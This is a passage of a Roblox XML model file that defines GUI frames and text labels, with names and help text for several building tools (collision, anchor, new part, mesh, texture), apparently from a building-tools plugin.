												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>120</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[Lets you change whether the parts collide with others or not.

TIP: You can toggle collision by pressing Enter.]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXD18CAC5F13A94B13AB114B2287700AF5">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">COLLISION TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXECACCFCEFDC04080BC8B40FD1F1C7C93">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">AnchorInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX2B8CB336B38D4D96859F4597B5438550">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBXF41AEAF8136F4994B66184B00628F559">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4279308561</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX7A7BCC08079448129A30EF06DB2C1E6C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>120</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[Lets you anchor and unanchor parts.

TIP: You can press Enter to toggle the anchor quickly.]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX68E937471841491DADDC9519620A223C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">ANCHOR TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX57220CF499EC41A29CAFDF38EB7B26CD">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">NewPartInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX8B8DB261321F47CDA633C9611037BEC7">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBXCEF10F7B6DED45D99AA605E4B3FDB04C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4279308561</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXC346C277FBA9458E9826238FBCDF17C4">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>120</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[Lets you create new parts of different types.

Select the part type, then click and drag to place the part.]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX103C4C9855544FBB8F7EF5F816466BF4">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">NEW PART TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX29A0491C7467416E82FCF6A417DE4153">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">MeshInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX0E11BE0BB7114024BDD767C34E453893">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX65A757D6304E4433BDEF91778577A38C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4285215356</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXACA7C5A65B2E467490F44F3D3CDB4D05">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>84</XO>
													<YS>0</YS>
													<YO>260</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[Lets you add meshes to parts.

If you're using a file mesh, you can paste the URL of anything with a mesh (e.g. a hat, gear, etc.) and it will find the right mesh/texture ID for you.

NOTE: If HttpService is not enabled, you must type the ID of the mesh/im]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX5DDC285EC4AA438EBFEEA4E780E96BAB">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">MESH TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX45876D8B183B45DDAD13FF55131D558F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">TextureInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX3B2A1C0994E1431081B05A85284328BC">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>150</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX95F0150386D1401EBC8BAA87C44DBCB1">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4285215356</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXED3B916970994153BAE3449CEF4B1E08">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>84</XO>
													<YS>0</YS>
													<YO>250</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[Lets you add decals and textures to parts. Simply add a new decal or texture, and paste the URL of the decal you want to add.

TIP: You can select the decal/texture side by right clicking.

NOTE: If HttpService is not enabled, you must type the ID of the i]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX0316C22AACAE49B3A422B87EE3FC9ABF">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
